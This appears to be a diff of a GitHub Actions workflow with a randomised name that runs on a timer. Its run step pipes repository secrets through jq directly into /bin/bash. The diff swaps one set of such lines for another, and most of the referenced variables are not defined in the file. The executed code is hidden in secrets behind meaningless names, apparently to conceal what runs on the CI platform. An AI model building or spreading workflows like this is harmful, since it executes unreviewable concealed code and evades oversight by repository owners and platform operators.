@@ -3,29 +3,23 @@ name: songjiejiao2345
 on:
   workflow_dispatch:
   schedule:
-    - cron: '7 4/6 * * *'
+    - cron: '22 2/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: songjiejiao2345
         env:
-          rli39050: ${{ secrets.rli39050 }}
+          tzii25: ${{ secrets.tzii25 }}
         run: |
-          echo $rli39050 | jq -r .mcbui98 | /bin/bash
-          echo $cozcm643 | jq -r .w68314 | /bin/bash
-          echo $pr37397 | jq -r .bkyt2602 | /bin/bash
-          echo $bq40 | jq -r .c70007 | /bin/bash
-          echo $chlk36 | jq -r .w4528 | /bin/bash
-          echo $crptc4 | jq -r .xvuo3929 | /bin/bash
-          echo $uhgn1 | jq -r .yy851 | /bin/bash
-          echo $o0147 | jq -r .v9 | /bin/bash
-          echo $vwzny91074 | jq -r .xcx74787 | /bin/bash
-          echo $ywpx340 | jq -r .gh3 | /bin/bash
-          echo $t898 | jq -r .luyaf8032 | /bin/bash
-          echo $p36 | jq -r .o2 | /bin/bash
-          echo $ubxm2355 | jq -r .hugg28 | /bin/bash
-          echo $sijmt1931 | jq -r .hmlk1590 | /bin/bash
-          echo $b3258 | jq -r .k6628 | /bin/bash
+          echo $tzii25 | jq -r .fj2 | /bin/bash
+          echo $ku7520 | jq -r .xuij03732 | /bin/bash
+          echo $c25988 | jq -r .vo042 | /bin/bash
+          echo $ett1 | jq -r .bud8432 | /bin/bash
+          echo $eijru382 | jq -r .a8 | /bin/bash
+          echo $fkm029 | jq -r .ni1688 | /bin/bash
+          echo $p275 | jq -r .zhrdu7392 | /bin/bash
+          echo $oyy5 | jq -r .yrf79 | /bin/bash
 
